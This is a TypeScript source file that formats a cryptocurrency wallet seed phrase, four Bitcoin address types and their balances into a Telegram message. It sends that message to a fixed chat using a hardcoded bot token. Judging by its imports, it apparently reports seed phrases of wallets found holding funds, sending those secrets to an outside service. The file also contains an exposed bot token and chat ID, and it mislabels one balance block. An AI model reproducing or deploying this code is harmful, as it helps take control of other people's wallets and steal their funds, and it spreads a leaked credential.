import TelegramBot from "node-telegram-bot-api";
import { WalletConCashItem } from "../leer/leerSeguimientoWalletCash";

const token = "7943951367:AAG0X-lhN4kkIaR0oLV-63ZWwgwfgqisTOs";
const bot = new TelegramBot(token, { polling: false });
const chatId = "814041563";

export const enviarMensajeTelegram = (msj: WalletConCashItem): void => {
    const mensaje = `   📢 Semilla: 
                        ${msj.frase}
                        ---------------
                        👛 Wallet_Legacy: 
                        ${msj.direccion_legacy}
                        ---------------
                        👛 Wallet_NativeSegWit: 
                        ${msj.direccion_NativeSegWit}
                        ---------------
                        👛 Wallet_Taproot: 
                        ${msj.direccion_Taproot}
                        ---------------
                        👛 Wallet_wrapped: 
                        ${msj.direccion_wrapped}
                        ---------------
                        💰 Saldo actual_legacy: ${msj.saldoActual_legacy}
                        📥 Saldo recibido: ${msj.saldoRecibido_legacy}
                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_legacy}
                        ---------------
                        💰 Saldo actual_NativeSegWit: ${msj.saldoActual_NativeSegWit}
                        📥 Saldo recibido: ${msj.saldoRecibido_NativeSegWit}
                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_NativeSegWit}
                        ---------------
                        💰 Saldo actual_Taproot: ${msj.saldoActual_Taproot}
                        📥 Saldo recibido: ${msj.saldoRecibido_Taproot}
                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_Taproot}
                        ---------------
                        💰 Saldo actual_Taproot: ${msj.saldoActual_wrapped}
                        📥 Saldo recibido: ${msj.saldoRecibido_wrapped}
                        ⏳ Saldo sin confirmar: ${msj.saldoSinConfirm_wrapped}
                        `;
      bot
      .sendMessage(chatId, mensaje)
      .then(() => {
        console.log("Mensaje enviado con éxito 📢");
      })
      .catch((error) => {
        console.error("Error al enviar el mensaje:", error);
      });
  };